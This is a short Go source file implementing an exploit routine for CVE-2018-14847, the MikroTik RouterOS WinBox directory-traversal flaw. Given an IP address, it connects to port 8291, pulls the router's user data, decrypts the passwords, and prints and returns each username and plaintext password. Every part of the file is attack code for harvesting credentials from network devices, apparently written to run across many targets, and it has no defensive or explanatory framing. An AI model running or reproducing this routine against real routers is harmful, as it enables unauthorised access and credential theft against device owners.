package ms

import "fmt"

// https://nvd.nist.gov/vuln/detail/cve-2018-14847
// MikroTik RouterOS through 6.42 allows unauthenticated remote attackers to read arbitrary files
// and remote authenticated attackers to write arbitrary files due to a directory traversal
// vulnerability in the WinBox interface
// port 8291
func CVE_2018_14847(ip string) []string {
	port := "8291"
	var data []byte
	var err error
	if data, err = connectToRouter(ip, port); err != nil {
		//log.Fatal(err)
	}
	users, err := getUsersAandDecryptPasswords(data)
	if err != nil {
		//log.Fatal(err)
	}
	//fmt.Printf("Checking... %s\n",ip)
	a := []string{}
	for _, u := range users {
		a = append(a, fmt.Sprintf("%s\t%s %s\n", ip, u.username, u.pass))
		////fmt.Printf("Username: %s Password: %s\n", u.username, u.pass)
		fmt.Printf("%s\t%s %s\n", ip, u.username, u.pass)
	}
	return a
}
